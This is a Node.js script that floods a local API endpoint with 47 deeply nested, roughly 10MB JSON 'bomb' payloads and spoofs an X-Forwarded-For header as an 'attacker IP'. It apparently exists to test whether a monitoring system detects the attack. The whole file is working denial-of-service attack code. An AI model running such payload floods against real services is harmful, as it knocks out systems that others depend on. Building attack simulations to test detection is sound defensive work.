const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

function generateJsonBomb(depth, payloadSize) {
  let root = {}
  let current = root

  for (let i = 0; i < depth; i++) {
    current.child = {}
    current = current.child
  }

  current.data = "A".repeat(payloadSize)
  return root
}

function formatBytes(bytes) {
  return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
}

async function attack() {
  const fetchModule = await import("node-fetch");
  const fetchFn = fetchModule.default;

  console.log('\n' + '='.repeat(80));
  console.log('💣 STARTING JSON PAYLOAD BOMB ATTACK');
  console.log('='.repeat(80));
  console.log('\n🎯 Target: http://localhost:4000/api/search');
  console.log('🔥 Attack Type: JSON Payload Bomb');
  console.log('📦 Payload Size: ~10MB per request');
  console.log('🔢 Total Requests: 47');
  console.log('⏱️  Delay: 300ms between requests');
  console.log('🌐 Attacker IP: 203.0.113.45\n');

  const startTime = Date.now();
  let successCount = 0;
  let errorCount = 0;

  for (let i = 0; i < 47; i++) {
    // Generate ~10MB payload (depth 100, 10MB of data)
    const payload = generateJsonBomb(100, 10_000_000);
    const payloadStr = JSON.stringify(payload);
    const payloadSize = Buffer.byteLength(payloadStr);

    try {
      const reqStart = Date.now();
      const response = await fetchFn("http://localhost:4000/api/search", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Forwarded-For": "203.0.113.45" // attacker IP
        },
        body: payloadStr
      });

      const reqTime = Date.now() - reqStart;
      
      if (response.ok) {
        successCount++;
        console.log(`✅ Request ${i + 1}/47: ${formatBytes(payloadSize)} sent, ${reqTime}ms response`);
      } else {
        errorCount++;
        console.log(`⚠️  Request ${i + 1}/47: ${formatBytes(payloadSize)} sent, ${response.status} ${response.statusText}`);
      }
    } catch (error) {
      errorCount++;
      console.log(`❌ Request ${i + 1}/47: Failed - ${error.message}`);
    }

    // small delay between requests
    await new Promise(r => setTimeout(r, 300));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);

  console.log('\n' + '='.repeat(80));
  console.log('💥 ATTACK COMPLETED');
  console.log('='.repeat(80));
  console.log(`\n📊 Attack Summary:`);
  console.log(`   • Total Requests: 47`);
  console.log(`   • Successful: ${successCount}`);
  console.log(`   • Failed: ${errorCount}`);
  console.log(`   • Total Time: ${totalTime}s`);
  console.log(`   • Average Rate: ${(47 / parseFloat(totalTime)).toFixed(1)} req/s`);
  console.log(`\n🎯 The monitoring system should detect this attack within 60 seconds.`);
  console.log('='.repeat(80) + '\n');
}

attack()
